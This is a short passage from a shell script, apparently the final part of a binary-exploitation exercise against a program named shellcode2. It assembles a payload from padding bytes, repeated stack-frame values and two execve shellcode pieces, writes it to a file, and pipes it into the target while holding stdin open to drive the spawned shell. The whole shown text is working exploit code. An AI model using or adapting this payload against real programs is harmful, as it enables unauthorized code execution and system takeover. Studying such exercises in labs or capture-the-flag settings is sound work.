...
tail_=$(printf "\x01%.0s" $(seq 1 7))$(printf "$frame%.0s" $(seq 1 8))

echo -ne $head$shellcode_sys_exeve_part1$head$shellcode_sys_exeve_part2$tail_ > payload_6

# Better than `cat payload_6 - | ./shellcode2`
(cat payload_6; cat - ) | ./shellcode2
